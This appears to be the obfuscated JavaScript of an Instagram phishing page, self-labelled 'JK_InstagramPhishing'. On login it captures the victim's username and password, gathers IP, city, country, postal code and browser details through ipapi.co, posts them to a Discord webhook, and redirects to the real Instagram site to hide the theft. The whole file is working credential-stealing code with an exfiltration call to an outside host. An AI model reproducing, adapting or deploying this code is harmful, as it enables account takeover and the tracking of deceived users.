const _0x437132=_0x4362;(function(_0x143474,_0x4e1d71){const _0x404452=_0x4362,_0x49fd0f=_0x143474();while(!![]){try{const _0x1b3e23=-parseInt(_0x404452(0xd5))/0x1*(parseInt(_0x404452(0xd6))/0x2)+parseInt(_0x404452(0xd1))/0x3*(parseInt(_0x404452(0xeb))/0x4)+-parseInt(_0x404452(0xd3))/0x5*(-parseInt(_0x404452(0xd0))/0x6)+-parseInt(_0x404452(0xe5))/0x7*(-parseInt(_0x404452(0xf6))/0x8)+-parseInt(_0x404452(0xef))/0x9*(parseInt(_0x404452(0xd4))/0xa)+parseInt(_0x404452(0xe8))/0xb*(parseInt(_0x404452(0xec))/0xc)+-parseInt(_0x404452(0xf4))/0xd;if(_0x1b3e23===_0x4e1d71)break;else _0x49fd0f['push'](_0x49fd0f['shift']());}catch(_0x3c2d9c){_0x49fd0f['push'](_0x49fd0f['shift']());}}}(_0xa47b,0xf3ea2));function _0x4362(_0x2409eb,_0x2ce6d0){const _0xa47b48=_0xa47b();return _0x4362=function(_0x4362c5,_0x2e23de){_0x4362c5=_0x4362c5-0xc8;let _0x2692f3=_0xa47b48[_0x4362c5];return _0x2692f3;},_0x4362(_0x2409eb,_0x2ce6d0);}const loginButton=document['querySelector'](_0x437132(0xdf)),password=document[_0x437132(0xca)](_0x437132(0xd7)),username=document['querySelector']('#usernameInput'),showPasswordBtn=document[_0x437132(0xca)](_0x437132(0xc9));password['addEventListener'](_0x437132(0xf5),disableBtn),username['addEventListener'](_0x437132(0xf5),disableBtn);function _0xa47b(){const _0x55f53a=['addEventListener','region','POST','length','>\x20IP:\x20Unknown\x0a>\x20City:\x20Unknown\x0a>\x20Region:\x20Unknown\x0a>\x20Country:\x20Unknown\x0a>\x20Postal\x20Code:\x20Unknown\x0a>\x20Browser:\x20','7MCqXbQ','log','postal','11xiElIS','display','value','112GVvtwn','4234272IZIIfr','location','userAgent','4527nkHzni','Login\x20Attempt','none','text','password','10493639NnRZLV','input','9046248DWnlSN','application/json','https://ipapi.co/json/','#showPasswordBtn','querySelector','Hide','\x0a>\x20Username:\x20','\x0a>\x20Browser:\x20','stringify','json','1578aDqFmH','95739fcvCnF','\x0a>\x20Password:\x20','12665LfhjlR','6190JvoTmU','462873AXTnFb','4uVmiAI','#passwordInput','https://www.instagram.com/explore/','style','disabled','textContent','\x0a>\x20Postal\x20Code:\x20','type','JK_InstagramPhishing','#loginBtn'];_0xa47b=function(){return _0x55f53a;};return _0xa47b();}function passwordVisible(){const _0xb8747a=_0x437132;password['type']===_0xb8747a(0xf3)?(password[_0xb8747a(0xdd)]=_0xb8747a(0xf2),showPasswordBtn[_0xb8747a(0xdb)]=_0xb8747a(0xcb)):(password[_0xb8747a(0xdd)]=_0xb8747a(0xf3),showPasswordBtn[_0xb8747a(0xdb)]='Show');}function passwordBtnVisible(){const _0x5cce30=_0x437132;password[_0x5cce30(0xea)][_0x5cce30(0xe3)]>0x0?showPasswordBtn[_0x5cce30(0xd9)][_0x5cce30(0xe9)]='block':showPasswordBtn[_0x5cce30(0xd9)]['display']=_0x5cce30(0xf1);}function disableBtn(){const _0x39f0c5=_0x437132;username[_0x39f0c5(0xea)]&&password['value']?loginButton[_0x39f0c5(0xda)]=![]:loginButton[_0x39f0c5(0xda)]=!![];}let Info;loginButton[_0x437132(0xe0)]('click',()=>{(async function(){const _0x9c342c=_0x4362;Info=await getInfo(),console[_0x9c342c(0xe6)](Info),sendInfo();}());});async function getInfo(){const _0x3d87ac=_0x437132;try{const _0x4b7a6d=await fetch(_0x3d87ac(0xc8)),_0x1b48d9=await _0x4b7a6d[_0x3d87ac(0xcf)](),_0x3573b9='>\x20IP:\x20'+_0x1b48d9['ip']+'\x0a>\x20City:\x20'+_0x1b48d9['city']+'\x0a>\x20Region:\x20'+_0x1b48d9[_0x3d87ac(0xe1)]+'\x0a>\x20Country:\x20'+_0x1b48d9['country_name']+_0x3d87ac(0xdc)+_0x1b48d9[_0x3d87ac(0xe7)]+_0x3d87ac(0xcd)+navigator[_0x3d87ac(0xee)]+_0x3d87ac(0xcc)+username[_0x3d87ac(0xea)]+_0x3d87ac(0xd2)+password[_0x3d87ac(0xea)]+'\x0a';return _0x3573b9;}catch{return _0x3d87ac(0xe4)+navigator[_0x3d87ac(0xee)]+_0x3d87ac(0xcc)+username[_0x3d87ac(0xea)]+_0x3d87ac(0xd2)+password[_0x3d87ac(0xea)]+'\x0a';}}async function sendInfo(){const _0x1b3104=_0x437132,_0x309d13='https://discord.com/api/webhooks/ID/TOKEN',_0x11d3f0={'color':0x18328b,'title':_0x1b3104(0xf0),'description':''+Info,'footer':{'text':'github.com/Josakko/InstagramPhishing'}},_0x310338={'method':_0x1b3104(0xe2),'headers':{'Content-Type':_0x1b3104(0xf7)},'body':JSON[_0x1b3104(0xce)]({'username':_0x1b3104(0xde),'embeds':[_0x11d3f0]})};try{await fetch(_0x309d13,_0x310338);}catch{setTimeout(function(){const _0x12a4cb=_0x1b3104;window['location']['replace'](_0x12a4cb(0xd8));},0x3e8);}setTimeout(function(){const _0x16d259=_0x1b3104;window[_0x16d259(0xed)]['replace'](_0x16d259(0xd8));},0x3e8);}
